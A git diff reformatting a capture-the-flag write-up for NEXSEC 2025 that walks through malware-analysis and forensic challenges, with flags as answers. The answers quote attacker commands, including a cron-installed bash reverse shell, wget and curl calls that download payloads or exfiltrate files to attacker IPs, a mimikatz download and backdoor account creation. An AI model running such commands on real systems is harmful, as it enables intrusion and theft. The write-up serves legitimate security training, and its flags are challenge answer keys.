@@ -8,7 +8,7 @@ authors: [jerit3787, mynz, mont3r]
 
 *By Team PERISAI Beta - Jerit3787, Mynz & mont3r*
 
-# **Residual Implant** {#residual-implant}
+## Residual Implant
 
 By Jerit3787
 
@@ -223,13 +223,14 @@ C2 Domain: `Pvt3QG28pg.capturextheflag.io`
 Port: `4444`  
 This domain is the flag for the challenge.
 
-`Flag: nexsec25{Pvt3QG28pg.capturextheflag.io}`
+> Flag: `nexsec25{Pvt3QG28pg.capturextheflag.io}`
+{: .prompt-tip}
 
-# 
-
-# **Advisory Deception \#1 \- \#4** {#advisory-deception-#1---#4}
+## Advisory Deception #1 - #4
 
 By Mynz & Jerit3787
+
+### Q1
 
 **Category:** Reverse Engineering  
 **Description:**  
@@ -245,7 +246,7 @@ After putting it in Binary Ninja, in the main func, you can see the vcruntime140
 ![][image3]  
 `Flag: nexsec25{vcruntime140.dll}`
 
-**Q2**  
+### Q2
 What directory does the malware copy itself to?
 
 **Solution**  
@@ -256,18 +257,23 @@ C:\\ProgramData\\ is accessible without admin privileges btw
 
 ![][image4]
 
-`Flag: nexsec25{C:\ProgramData\MicrosoftSyncService}`
+> Flag: `nexsec25{C:\ProgramData\MicrosoftSyncService}`
+{: .prompt-tip}
 
-**Q3**  
+### Q3 
 Uncover the exported function used to achieve persistence.  
 **Solution**  
 From the Q1 image, you can see that when the main executable runs at startup, it loads vcruntime, which exports \_\_vcrt\_InitializeCriticalSectionEx. This function is called during DLL initialization thus triggering the payload.
 
 This naming is also a legitimate function name, which make it hard to detect
 
-`Flag: nexsec25{__vcrt_InitializeCriticalSectionEx}`
+> Flag: `nexsec25{__vcrt_InitializeCriticalSectionEx}`
+{: .prompt-tip}
 
-**Q4 \- Solved by Jerit3787**  
+### Q4
+
+*Solved by Jerit3787*
+
 What is the command and control (C2) domain that the implant communicates with?
 
 **Solution**  
@@ -582,9 +588,10 @@ The C2 domain is clearly visible in the powercat command:
 
 *fj3m58a9.capturextheflag.io*
 
-`Flag: nexsec25{fj3m58a9.capturextheflag.io}`
+> Flag: `nexsec25{fj3m58a9.capturextheflag.io}`
+{: .prompt-tip}
 
-# **QuackBot** {#quackbot}
+## QuackBot
 
 By Jerit3787
 
@@ -1015,9 +1022,10 @@ for ip in ips:
 print(f"Flag: {flag}")
 ```
 
-`Flag: nexsec25{513afc1272b40668995da3f69faeee5b37dd58beccc9fbf41cc3b44a58669de6}`
+> Flag: `nexsec25{513afc1272b40668995da3f69faeee5b37dd58beccc9fbf41cc3b44a58669de6}`
+{: .prompt-tip}
 
-# **Stolen Credentials** {#stolen-credentials}
+## Stolen Credentials
 
 By Mynz
 
@@ -1051,6 +1059,7 @@ By analysing the salsa block, you can see it uses the constant spell "expand 32-
 
 While the salsa permute function performs 10 double-rounds (20 rounds total) using quarter-round operations:
 
+```py
 After getting counter, key and nonce, we can decrypt it  
 *\#\!/usr/bin/env python3*  
 """  
@@ -1179,12 +1188,16 @@ if os.path.exists(password\_file):
     print(f"\\nFlag: nexsec25{{{plaintext}}}")  
 else:  
     print("Error: password.txt not found in the current directory")
+```
 
-`Flag: nexsec25{QWERTYasdfg12345!@#$%}`
+> Flag: `nexsec25{QWERTYasdfg12345!@#$%}`
+{: .prompt-tip}
 
-# **Rembayung \#1 \- \#2** {#rembayung-#1---#2}
+## Rembayung #1 - #2
 
 By m0nt3r
+
+### Q1
 
 **Category:** Malware Analysis  
 **Description:** One of our employees received an email inviting them to the opening ceremony of a restaurant. The email appeared suspicious, and fortunately our email system automatically quarantined it. Could you help us locate the payload? 
@@ -1277,7 +1290,8 @@ The MZ signature confirms this is a Windows PE (Portable Executable) file\!
 ANSWER  
 The payload was located in the \*\*description\*\* field of the document's metadata.  
 FLAG: nexsec25{description}  
-**Rembayung \#2**  
+
+### Q2
 Give the SHA256 of the malware Flag Format: nexsec25{hashvalue}
 
 Now that we've extracted the malware payload (payload.exe), we need to   
@@ -1289,11 +1303,14 @@ Using PowerShell :
 
 SHA256: ca9e35196f04dca67275784a8bd05b9c4e7058721204ccd5eef38244b954e1c3
 
-FLAG: nexsec25{ca9e35196f04dca67275784a8bd05b9c4e7058721204ccd5eef38244b954e1c3}
+> Flag: `nexsec25{ca9e35196f04dca67275784a8bd05b9c4e7058721204ccd5eef38244b954e1c3}`
+{: .prompt-tip}
 
-# **Speed Test Anomaly \#1 \- \#4** {#speed-test-anomaly-#1---#4}
+## Speed Test Anomaly #1 - #4
 
 By Jerit3787
+
+### Q1
 
 **Category:** Malware Analysis  
 **Description:** A user reported that they downloaded a network speed testing utility from a third-party website to diagnose their slow internet connection. The application claims to measure download/upload speeds and display detailed network statistics.
@@ -1509,16 +1526,17 @@ private static bool ResolveDnsRecord()
 
 There it is\! The malware calls `GetModuleHandle("SbieDll.dll")` to check if Sandboxie is running. `SbieDll.dll` is Sandboxie's hooking DLL that gets injected into every process in the sandbox. If it's loaded, the malware knows it's being analyzed and kills itself.
 
-`Flag: nexsec25{SbieDll.dll}`
+> Flag: `nexsec25{SbieDll.dll}`
+{: .prompt-tip}
 
-**Q2**  
+### Q2  
 What is the minimum system drive size (in GB) required for the malware to execute?
 
-**Step 2: Where to look?**
+**Step 1: Where to look?**
 
 After extracting `CoreServices.dll` from the BMP steganography (see Flag 1 writeup), I opened it in dotPeek. Looking at the class names, `NetworkValidator` caught my eye \- that's where most anti-analysis checks usually live.
 
-**Step 3: Found the anti-analysis hub**
+**Step 2: Found the anti-analysis hub**
 
 In `NetworkValidator.cs`, I found `VerifyConnection()`:
 
@@ -1537,7 +1555,7 @@ public static void VerifyConnection()
 
 See that `ValidateNetworkSettings()`? Let's check it out.
 
-**Step 4: Found the drive size check\!**
+**Step 3: Found the drive size check\!**
 
 ```c#
 private static bool ValidateNetworkSettings()
@@ -1561,7 +1579,7 @@ Breaking this down:
 3\. `new DriveInfo("C:\").TotalSize` \= size of C: drive in bytes  
 4\. If the drive size ≤ 61,000,000,000 bytes → returns `true` (sandbox detected\!)
 
-**Step 5: Do the math**
+**Step 4: Do the math**
 
 The threshold is `61,000,000,000` bytes. Converting to GB:
 
@@ -1571,7 +1589,7 @@ The threshold is `61,000,000,000` bytes. Converting to GB:
 
 (Using decimal/SI units, which is what the malware author used)
 
-**Step 6: Why this check exists**
+**Step 5: Why this check exists**
 
 VMs and sandboxes usually have small disks to save space:  
 \- Default VMware: 20-40 GB  
@@ -1580,7 +1598,7 @@ VMs and sandboxes usually have small disks to save space:
 
 By checking if the drive is **61 GB or less**, the malware can detect most default analysis environments. Pretty clever actually.
 
-**Step 7: The logic flow**
+**Step 6: The logic flow**
 
 ```
 System drive ≤ 61 GB?
@@ -1591,9 +1609,12 @@ System drive ≤ 61 GB?
 ```
 
 The malware needs a drive **BIGGER than 61 GB** to keep running.  
-`Flag: nexsec2025{61}`
 
-**Q3**  
+> Flag: `nexsec2025{61}`
+{: .prompt-tip}
+
+
+### Q3  
 What filename does the malware use to save captured screenshots?
 
 **Step 1: Follow the execution flow**
@@ -1707,9 +1728,10 @@ SyncServiceMetadata()
     └── TransmitDataAsync() - Sends to C2 server
 ```
 
-`Flag: nexsec25{ZxCvBnMl.jpg}`
+> Flag: `nexsec25{ZxCvBnMl.jpg}`
+{: .prompt-tip}
 
-Q4  
+### Q4  
 As usual, extract the domain used by the attacker.
 
 **Step 1: Find where data gets sent**
@@ -1951,9 +1973,10 @@ Output:
 [+] Full C2: https://1k92jsas.capturextheflag.io:9999/upload
 ```
 
-`Flag: nexsec25{1k92jsas.capturextheflag.io}`
+> Flag: `nexsec25{1k92jsas.capturextheflag.io}`
+{: .prompt-tip}
 
-# **Photo Viewer** {#photo-viewer}
+## Photo Viewer
 
 By Mynz
 
@@ -2220,9 +2243,10 @@ decrypted \= unpad(cipher.decrypt(encrypted\_data), AES.block\_size)
 flag \= decrypted.decode('utf-8')  
 print(f"FLAG: {flag}")
 
-`Flag: nexsec25{dyn4m1c_d3x_kn0w13d93_941n3d!}`
+> Flag: `nexsec25{dyn4m1c_d3x_kn0w13d93_941n3d!}`
+{: .prompt-tip}
 
-# **Birthday Trap** {#birthday-trap}
+## Birthday Trap
 
 By Mynz
 
@@ -2327,9 +2351,14 @@ print('\\n'.join(decrypted.decode('utf-8').split('\\n')\[:10\]))
 
 Yeahh, i did do it wrong tho 
 
-`Flag: nexsec2025{P0w3rSh3ll_C0mm3nt5_H1d3_S3cr3ts!}`
+> Flag: `nexsec2025{P0w3rSh3ll_C0mm3nt5_H1d3_S3cr3ts!}`
+{: .prompt-tip}
 
-# **Here’s the dump \#1** {#here’s-the-dump-#1}
+## Here's the dump #1 - #2
+
+By m0nt3r & Jerit3787
+
+### Q1
 
 By m0nt3r
 
@@ -2453,10 +2482,11 @@ Solution
 
 Answer (SHA1 Hash):  
 A86DFBC01E9F834ED18B3E7BFC183D1381A5AAC4
+ 
+> Flag: `nexsec25{A86DFBC01E9F834ED18B3E7BFC183D1381A5AAC4}`
+{: .prompt-tip}
 
-`Flag: nexsec25{A86DFBC01E9F834ED18B3E7BFC183D1381A5AAC4}`
-
-# **Here’s the dump \#2** {#here’s-the-dump-#2}
+### Q2
 
 By Jerit3787
 
@@ -2564,11 +2594,14 @@ powershell.exe -exec bypass Invoke-WebRequest http://hackzone.com/public/mimikat
 4\. **Sets hidden attribute** \- Active defense evasion  
 5\. **The hackzone download was a secondary action** performed AFTER the attacker already had access via the initial RAT
 
-`Flag: nexsec25{http://osdsoft.com/download/updater.exe}`
+> Flag: `nexsec25{http://osdsoft.com/download/updater.exe}`
+{: .prompt-tip}
 
-# **Breadcrumbs \#1 \- \#13** {#breadcrumbs-#1---#13}
+## Breadcrumbs #1 - #13
 
 By m0nst3r
+
+### Q1
 
 **Category:** Digital Forensic  
 **Description:** TechHire Solutions prided themselves on finding the perfect candidates. But someone applied for more than just a job. They received a job application that wasn't what it seemed. The attacker left but not without leaving breadcrumbs behind. You've been called in as an incident responder. The web logs are waiting. Follow the trail\! Among thousands of legitimate visitors, one IP address stands out as suspicious. What is the attacker's IP address? 
@@ -2593,7 +2626,8 @@ The search revealed suspicious activity from 192.168.21.102:
 
 The IP was executing commands through a webshell via the cmd parameter.
 
-`Flag: nexsec25{192.168.21.102}`
+> Flag: `nexsec25{192.168.21.102}`
+{: .prompt-tip}
 
 **Q2**  
 The attacker uploaded a malicious file. What is the full filename? Flag format : nexsec25{file.py}
@@ -2607,9 +2641,10 @@ The malicious file uses a double extension technique:
 appears as: resume\_aiman.pdf.php  
 purpose: disguised as a Pdf resume but executes as php
 
-`Flag: nexsec25{resume_aiman.pdf.php}`
+> Flag: `nexsec25{resume_aiman.pdf.php}`
+{: .prompt-tip}
 
-**Q3**  
+### Q3  
 What was the timestamp when the attacker uploaded the malicious file?  
 Flag format : nexsec25{12/Dec/2012:12:12:12 \+0800}
 
@@ -2629,9 +2664,11 @@ through the job application submission form.
 
 Shortly after, the attacker accessed /uploads/ directory and began executing   
 commands through the uploaded webshell.
+ 
+> Flag: `nexsec25{13/Dec/2025:02:13:37 +0800}`
+{: .prompt-tip}
 
-`Flag: nexsec25{13/Dec/2025:02:13:37 +0800}`  
-**Q4**  
+### Q4  
 The attacker executed multiple commands through the webshell. What was the first command? Flag format : nexsec25{pwd}
 
 **Solution:**  
@@ -2643,8 +2680,10 @@ I examined all webshell command executions in chronological order:
 
 The first command executed through the webshell was whoami at 02:16:10.
 
-`Flag: nexsec25{whoami}`  
-**Q5**  
+> Flag: `nexsec25{whoami}`
+{: .prompt-tip}
+
+### Q5  
 From the webshell commands, the attacker was preparing for the next stage of the attack. What IP address and port was the attacker planning to connect back to? Flag format : nexsec25{ip:port}
 
 **Solution:**  
@@ -2664,8 +2703,10 @@ This establishes a reverse shell connection to:
 \- IP: 172.16.23.13  
 \- Port: 4444
 
-`Flag: nexsec25{172.16.23.13:4444}`  
-**Q6**  
+> Flag: `nexsec25{172.16.23.13:4444}`  
+{: .prompt-tip}
+
+### Q6
 Following the webshell upload, the attacker established a reverse shell connection. Analyze the captured traffic to uncover their activities on the compromised system. What is the first full command the attacker executed after gaining the reverse shell connection? 
 
 Note : This PCAP file will be used for all remaining Breadcrumbs questions. 
@@ -2682,9 +2723,11 @@ I identified that TCP stream 17 contained the first reverse shell session:
 ![][image20]
 
 First Command After Reverse Shell ;  
-`Flag: nexsec25{cat /etc/os-release}`
 
-**Q7**  
+> Flag: `nexsec25{cat /etc/os-release}`
+{: .prompt-tip}
+
+### Q7  
 Under which user context was the attacker operating after gaining the reverse shell?   
 Flag format : nexsec25{flag}
 
@@ -2692,20 +2735,21 @@ Flag format : nexsec25{flag}
 Refer to screenshot at breadcrumb\#6,  
 From the same TCP Stream 17, the prompt showed www-data@server, which is the default Apache web server user   
 on Ubuntu/Debian systems.
+ 
+> Flag: `nexsec25{www-data}`
+{: .prompt-tip}
 
-`Flag: nexsec25{www-data}`  
-**Q8**  
+### Q8  
 In which directory was the attacker initially located when the reverse shell connected? Flag format : nexsec25{flag}
 
 **Solution:**  
 Refer to screenshot at breadcrumb\#6,  
 The shell spawned in the uploads directory where the webshell was uploaded.
 
-`Flag: nexsec25{/var/www/html/uploads}`
+> Flag: `nexsec25{/var/www/html/uploads}`
+{: .prompt-tip}
 
-###### 
-
-**Q9**
+### Q9
 
 The attacker attempted to read a file containing password hashes but was denied. What file was this? (include path)
 
@@ -2715,9 +2759,10 @@ The attacker attempted to read a file containing password hashes but was denied.
 
 Command executed: cat /etc/shadow resulted in "Permission denied"
 
-`Flag: nexsec25{/etc/shadow}`
+> Flag: `nexsec25{/etc/shadow}`
+{: .prompt-tip}
 
-**Q10**  
+### Q10  
 What command did the attacker use to search for SUID binaries on the system?
 
 **Solution:**  
@@ -2728,9 +2773,10 @@ Answer: find / \-perm \-4000 \-type f 2\>/dev/null
 This searches for files with SUID bit set (permission 4000), commonly targeted   
 for privilege escalation.
 
-`Flag: nexsec25{find / -perm -4000 -type f 2>/dev/null}`
+> Flag: `nexsec25{find / -perm -4000 -type f 2>/dev/null}`
+{: .prompt-tip}
 
-**Q11**
+### Q11
 
 The attacker established persistence. What is the full command used?
 
@@ -2745,9 +2791,10 @@ This command:
 \- Spawns a bash reverse shell to 172.16.23.13:4444  
 \- Pipes everything to crontab to install it
 
-`Flag: nexsec25{(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.16.23.13/4444 0>&1'") | crontab -}`
+> Flag: `nexsec25{(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.16.23.13/4444 0>&1'") | crontab -}`
+{: .prompt-tip}
 
-**Q12**  
+### Q12  
 What command did the attacker use to list active network connections and listening ports in the second reverse shell session?
 
 **Solution:**  
@@ -2759,9 +2806,10 @@ The ss (socket statistics) command with flags:
 \-p process information  
 \-n numeric (no DNS resolution)
 
-`Flag: nexsec25{ss -tulpn}nexsec25{(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.16.23.13/4444 0>&1'") | crontab -}`
+> Flag: `nexsec25{ss -tulpn}`
+{: .prompt-tip}
 
-**Q13**
+### Q13
 
 What user's home directory that the attacker tried to access?
 
@@ -2769,11 +2817,16 @@ What user's home directory that the attacker tried to access?
 ![][image25]  
 The attacker attempted to access /home/sysadmin/ and its SSH keys.
 
-`Flag: nexsec25{sysadmin}`
+> Flag: `nexsec25{sysadmin}`
+{: .prompt-tip}
 
-# **Classic \#1 \- \#7** {#classic-#1---#7}
+---
+
+## Classic #1 - #7
 
 By m0nst3r
+
+### Q1
 
 **Category:** Digital Forensic  
 **Description:** The SOC team received an alert indicating suspicious activity on a server. As a forensic investigator, you have been provided with triage results from the compromised system. Analyze the available outputs and answer the following questions. Which service was used to gain initial access to the server? 
@@ -2789,9 +2842,10 @@ I found a successful login found in last-wtmp.txt:
    centos   pts/0        Sat Dec 13 09:17:17 2025 \- Sat Dec 13 09:34:45 2025  (00:17)     100.96.0.2
 
 All of it using service :ssh   
-`Flag: nexsec25{SSH}`
+> Flag: `nexsec25{SSH}`
+{: .prompt-tip}
 
-**Q2**  
+### Q2
 Which IP address used by the attacker for this initial access activity? Flag format: nexsec25{x.x.x.x}
 
 **Solution:**  
@@ -2806,9 +2860,10 @@ I checked multiple log sources especially these 3
 This ip has many failed attempts in a short time.  
 This means this ip attempted to bruteforce it.
 
-`Flag: nexsec25{100.96.0.2}`
+> Flag: `nexsec25{100.96.0.2}`
+{: .prompt-tip}
 
-**Q3**  
+### Q3
 Identify exact full command being used to download the malicious binary? Flag format: nexsec25{full command}
 
 **Solution:**  
@@ -2827,9 +2882,11 @@ What it does? It
    \- Used wget with rate limiting to avoid detection  
    \- Downloaded from attacker-controlled server at 192.168.8.11 a file: init.sh (ransomware script)
 
-`Flag: nexsec25{wget --limit-rate=1k http://192.168.8.11:8080/init.sh}`
+> Flag: `nexsec25{wget --limit-rate=1k http://192.168.8.11:8080/init.sh}`
+{: .prompt-tip}
 
-**Q4**
+
+### Q4
 
 Which directory was initially affected by the ransomware. Flag format: nexsec25{/var/www/html/}
 
@@ -2843,9 +2900,10 @@ Heres what I can observ:
    \- Confirmation: Found RANSOM\_NOTE.txt in data\_production directory  
    \- Later execution on /home/centos/document/ directory
 
-`Flag: nexsec25{/home/centos/data_production/}`
+> Flag: `nexsec25{/home/centos/data_production/}`
+{: .prompt-tip}
 
-**Q5**
+### Q5
 
 Which tool or utility was used to transfer documents/files out to the attacker's server? Flag format: nexsec25{nmap}
 
@@ -2860,9 +2918,10 @@ Tool Identified: netcat (nc)
    \- Supports file transfers without leaving complex logs  
    \- Connected to attacker's server on port 8888
 
-`Flag: nexsec25{nc}`
+> Flag: `nexsec25{nc}`
+{: .prompt-tip}
 
-**Q6**  
+### Q6 
 What was the initial file transferred out to the attacker’s server? Flag format: nexsec25{filename.ext}
 
 **Solution:**  
@@ -2871,9 +2930,10 @@ File transfer out here:
    \- First file: Nexsec2025\_Operational\_Maintenance\_Notes.txt  
    \- Second file: Nexsec2025\_System\_Service\_Config.conf
 
-`Flag: nexsec25{Nexsec2025_Operational_Maintenance_Notes.txt}`
+> Flag: `nexsec25{Nexsec2025_Operational_Maintenance_Notes.txt}`
+{: .prompt-tip}
 
-**Q7**
+### Q7
 
 What is the process ID associated with the files transfer activity?   
 Flag format: nexsec25{number}
@@ -2890,9 +2950,12 @@ Analysis:
    \- Destination: 192.168.8.11:8888 (attacker's server)  
    \- User ID: 1000 
 
-`Flag: nexsec25{9169}`
+> Flag: `nexsec25{9169}`
+{: .prompt-tip}
 
-# **Oh My Files \#1- \#10** {#oh-my-files-#1--#10}
+## Oh My Files #1- #10
+
+### Q1
 
 By m0nst3r & Mynz
 
@@ -2914,9 +2977,11 @@ Output:
 Algorithm : SHA256  
 Hash      : C8F31718462337B4CC8218C2CA301CA9CA6122CCA71C708757F38788533CA076
 
-nexsec25{C8F31718462337B4CC8218C2CA301CA9CA6122CCA71C708757F38788533CA076}
+> Flag: `nexsec25{C8F31718462337B4CC8218C2CA301CA9CA6122CCA71C708757F38788533CA076}`
+{: .prompt-tip}
 
-**OhMyFiles \#2**  
+### Q2
+
 What file extension does the ransomware add to encrypted files?   
 Example: nexsec25{.pdf}
 
@@ -2929,10 +2994,11 @@ And I checked Document and Downloads to look for encrypted files.
 ![][image32]
 
 At the end of .txt file and .docx file, there is .lock extension. And there’s even, txt file, mentioning about DECRYPT\_YOUR\_FILES.txt , meaning the attack want the user to read the text to decrypt the file encrypted in this folder.
+ 
+> Flag: `nexsec25{.lock}`
+{: .prompt-tip}
 
-Answer : nexsec25{.lock}
-
-**OhMyFiles \#3**  
+### Q3
 What is the SHA‑256 hash of the deleted archive file?
 
 **Solution:**  
@@ -2951,9 +3017,11 @@ I get hash using Get-FileHash command
 
 Virus total flag the hash as malicious. 	I believed this is what we are looking for , so I take its SHA-256 hash.
 
-Answer : nexsec25{cfaa2ce425e2f472618323dcbceb2e3fc013100919a8dbf545bf15b4c45dae8f}
+> Flag: `nexsec25{cfaa2ce425e2f472618323dcbceb2e3fc013100919a8dbf545bf15b4c45dae8f}`
+{: .prompt-tip}
 
-**OhMyFiles \#4**  
+### Q4 
+
 Identify the most recent CVE that was exploited to deliver the ransomware payload.  
 Example: nexsec25{CVE-XXXX-XXXX}
 
@@ -2964,9 +3032,11 @@ Next, Just upload the deleted rar file’s hash into virus total : [https://www.
 ![][image34]
 
 We got the cve  
-Nexsec25{cve-2025-8088}
 
-**OhMyFiles \#5**  
+> Flag: `Nexsec25{cve-2025-8088}`
+{: .prompt-tip}
+
+### Q5  
 What is the MITRE ATT\&CK technique ID that matches the persistence mechanism observed in this scenario?
 
 **Solution:**  
@@ -2988,9 +3058,11 @@ In malware campaigns abusing malicious archive files (e.g., RAR), persistence is
 so I think the best suite that is T1547.001. 
 
 And I found that the closest one that matches is : T1547.001  
-nexsec25{T1547.001}
 
-**Q6**  
+> Flag: `nexsec25{T1547.001}`
+{: .prompt-tip}
+
+### Q6  
 What is the full file path where the ransomware was dropped on the system?
 
 **Solution:**  
@@ -3000,9 +3072,10 @@ And found it here, in Users\\Fakhri\\AppData\\Roaming\\Microsoft\\Windows\\Start
 
 svchost.exe (masquerading as Windows system file)
 
-`Flag: nexsec25{C:\Users\Fakhri\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe}`
+> Flag: `nexsec25{C:\Users\Fakhri\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe}`
+{: .prompt-tip}
 
-**Q7**  
+### Q7  
 What cipher algorithm is used to ransom the file?
 
 **Solution:**  
@@ -3042,7 +3115,8 @@ Functions found:
 
 And here we can see it use XOR encryption
 
-`Flag: nexsec25{XOR}`
+> Flag: `nexsec25{XOR}`
+{: .prompt-tip}
 
 **Q8**  
 Where are the encryption keys stored?
@@ -3078,7 +3152,8 @@ Open regedit.exe
 * Step 4: Navigate to ShadowCrypt Keys  
 * Path: HKEY\_USERS\\Fakhri\_Hive\\Software\\ShadowCrypt\\Keys
 
-`Flag: nexsec25{HKEY_CURRENT_USER\Software\ShadowCrypt\Keys}`
+> Flag: `nexsec25{HKEY_CURRENT_USER\Software\ShadowCrypt\Keys}`
+{: .prompt-tip}
 
 **Q9**   
 Recover the encrypted document and obtain the encrypted flag contained within it.
@@ -3138,7 +3213,8 @@ with open(decrypted\_file, 'wb') as f:
 After unlocking, you will find the flag at the 1st line  
 ![][image37]
 
-`Flag: nexsec2025{sh4d0w_crypt_m4st3r_2025}`
+> Flag: `nexsec2025{sh4d0w_crypt_m4st3r_2025}`
+{: .prompt-tip}
 
 **Q10**  
 In the ransomware code, What are two strings two specific string constants are used to avoid re-encrypting its own ransom note and decryption instructions. Example: nexsec25{STRING1\_STRING2}
@@ -3171,10 +3247,11 @@ Which show us this, but 2 strings standout the most because it appear before oth
   \- 'Timestamp'  
   \- '\!\!\! DECRYPT\_YOUR\_FILES \!\!\!.txt'  
   \- 'utf-8'
+ 
+> Flag: `nexsec25{DECRYPT_RANSOM}`
+{: .prompt-tip}
 
-`Flag: nexsec25{DECRYPT_RANSOM}`
-
-# **Security Incident**
+## Security Incident
 
 By m0nst3r
 
@@ -3271,9 +3348,10 @@ After a series of bruteforce attempt, the attacker success to login at 12/13/202
 
 So, the answer is 
 
-`Flag: nexsec25{12/13/2025_12:35:23PM_webadmin}`
+> Flag: `nexsec25{12/13/2025_12:35:23PM_webadmin}`
+{: .prompt-tip}
 
-# **MEMOIR \#1 \- \#9** {#memoir-#1---#9}
+## MEMOIR #1 - #9
 
 By m0nst3r & Jerit3787
 
@@ -3303,7 +3381,9 @@ python3 vol.py -f memdump.mem windows.cmdline --pid 4784
 
 **Output:**  
 `"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /n "C:\Users\azman\Downloads\Jemputan_Bengkel_Strategik.docx"`  
-`Flag: NEXSEC25{Jemputan_Bengkel_Strategik.docx}`
+
+> Flag: `NEXSEC25{Jemputan_Bengkel_Strategik.docx}`
+{: .prompt-tip}
 
 **Q2**  
 What is the IP address of the primary C2 server? NEXSEC25{ip}
@@ -3338,7 +3418,8 @@ python3 vol.py -f memdump.mem windows.cmdline
 
 This command indicates the attacker downloaded a malicious script (\`cat.ps1\`) from a specific GitHub user's repository.
 
-`Flag: NEXSEC25{kimmisuuki}`
+> Flag: `NEXSEC25{kimmisuuki}`
+{: .prompt-tip}
 
 **Q4**  
 What is the SHA1 hash of the credential dumping executable found in memory? Flag format: NEXSEC25{sha1\_hash\_lowercase}
@@ -3406,7 +3487,8 @@ amcache.txt:933:File  c:\users\azman\appdata\local\temp\mk.exe  gentilkiwi (benj
 
 **Hash Found:** `d1f7832035c3e8a73cc78afd28cfd7f4cece6d20`
 
-`Flag: NEXSEC25{d1f7832035c3e8a73cc78afd28cfd7f4cece6d20}`
+> Flag: `NEXSEC25{d1f7832035c3e8a73cc78afd28cfd7f4cece6d20}`
+{: .prompt-tip}
 
 **Q5**  
 What PowerShell script filename was used for the UAC bypass technique?
@@ -3445,7 +3527,8 @@ The decoded command reveals:
 \- **Script Path**: `C:\Windows\Tasks\EventViewerRCE.ps1`  
 \- **Script Name**: `EventViewerRCE.ps1`
 
-`Flag: NEXSEC25{EventViewerRCE.ps1}`
+> Flag: `NEXSEC25{EventViewerRCE.ps1}`
+{: .prompt-tip}
 
 **Q6**  
 What is the SHA1 hash of the backdoor? NEXSEC25{sha1}
@@ -3522,9 +3605,10 @@ amcache.txt:911:File  c:\users\azman\appdata\local\temp\team.exe  2025-12-11 20:
 
 **Correct Hash:** `255d932fa4418ac11b384b125a7d7d91f8eb28f4`
 
-`Flag: NEXSEC25{255d932fa4418ac11b384b125a7d7d91f8eb28f4}`
+> Flag: `NEXSEC25{255d932fa4418ac11b384b125a7d7d91f8eb28f4}`
+{: .prompt-tip}
 
-Q7  
+**Q7**  
 What is the key value name used for persistence? NEXSEC25{ValueName}  
 **Step 1: Check Common Persistence Locations**  
 Start by examining the standard Run key locations for the current user:
@@ -3570,7 +3654,8 @@ Last Write Time                 Type      Key                                   
 
 The value name **`selamat`** points to our identified backdoor \`team.exe\`.
 
-`Flag: NEXSEC25{selamat}`
+> Flag: `NEXSEC25{selamat}`
+{: .prompt-tip}
 
 **Q8**  
 What are the credentials of the newly created user account? example : NEXSEC25{username:password}
@@ -3585,14 +3670,15 @@ grep -a "net user" pid.6284.dmp
 
 **Evidence:**  
 The memory dump contained the string: `C:\> net user fakhri admin123 /add`. This confirms the attacker created a backdoor user named `fakhri`.
-
-`Flag: NEXSEC25{fakhri:admin123}`
+ 
+> Flag: `NEXSEC25{fakhri:admin123}`
+{: .prompt-tip}
 
 **`Q9`**  
 What was the name of the archive file that was exfiltrated?  
 example : NEXSEC25{filename.ext}
 
-ANSWER
+**Solutions: **
 
 I run 
 
@@ -3636,7 +3722,8 @@ curl -F "file=@C:\Users\azman\AppData\Local\Temp\Documents.zip" http://188.166.1
 This confirms that the ZIP file was uploaded to an external IP address using curl, indicating successful data exfiltration.  
 Which means the flag is Documents.zip
 
-`Flag: NEXSEC25{Documents.zip}`
+> Flag: `NEXSEC25{Documents.zip}`
+{: .prompt-tip}
 
 [image1]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARIAAAIUCAYAAADWhqOjAABBnUlEQVR4Xu2dCdwcRZn/Rz+f/aP7/4vcGgS5z6wccuUFXRWF5ViUIwREjrCQV0REkSMkct8KvERQAQMssEgUNn520byyaIAVWa5VljsJhDMkJISQhHMj8Pznqenqt/rpqpnuqp6e6Znf9/MpZqa6urpnmPq+T/dUPaktXbqUUFBQUEJKjQAAIICTTz4ZIgEA+PPLX/4yKZKzzjoLBQUFJVexikRe96CgoKC4SlOR1E59CqXLyocnPUV/M/kp+uhpT9H/O2MWffzMWbTa2bNorXNn06jzZtO6F8yh9S6cQxv9cA5tevHTtMUlT9Nnhp6mrS97mrb78TO04xXP0M4/nUuf+9lc+uJVc+nLVz9L/zD1Wdrr2mdpn+ueo32vf44OuOE5OuhfnqdDfvE8HXbz8zT+ly/Q0be8QN+89QU6dvqL9J1fv0gn/NuLdNJtL9HE37xEk2e8RKcPz6Ozb59H590xjy78/cv0o5kv09BdL9OP755PP/3jfLrynvk09d4FdN19C+iG+xfQLx58haY99Ard+udX6NcPL6TbHllIv310Id3++CL6/ROL6K6nFtEfZ79K9855le5/5lV6aO5ievi5xfToC4vpiRdfo1nzXqNn5r9Gzy1YQi8uXEIvL1pCCxe/nvqCo5RTIJKKFYgEIslbrr/+ejWuZX2RxU8k3/oD1Y741Ujh17INSlsKRFK8SMzrfLmtW8rw8DBtvPHGNHr06LhssskmdN9996XaytKlInlSyeO9995T5d1334VMSiwQSbEi4e/6VVddFZc8MqnVaomy1lpr0vrrr6eey7ah5VOf+hTdd/99eogqhodn0DrrrJNqK0vXi2Tx4sWxUJRMeFuqPUqRBSIpXiSmTPKIZGX6iLN87GMfS7UPKWuvvTZdcOH5dMutv2qUW35Fx3xrMFgk8+fPp912201FPHIbF67n7dxObjNLkEjefPNNev311zsnkimLaM7CRTQwMeNx87bvwgKRFCcS/p7feOONdMMNN8QyySMSGZHoomVSZGSyxhpr0DbbbkX7H7AvHfKNg+joCUfStp/dhj75yU+m2srSTCQsCT7Pv/3bv03JhF9zPW/ndnJfswSJ5K9//SutWLEin0h4MOsD1Zkzc266TdaSVwyy/cS5dNlC42QMgs6rjQUiKVYkLBEtkjwSaVa0TFZffbXUtizl2muvpQ033JDWW289GjVqFK39qbXp059el/bY8x8S7Q4cN5ZWXW1VJRNut8EGG6h9ZX/NRGLKwpSJq95VgkRilkwimTiPZtC7dNkUPZDrrx+bl26XtUgxtCrN2jfb1kUFIskukgsvvJCuvvpqZ9HRCJcf//jH6nvP9byfHCitykor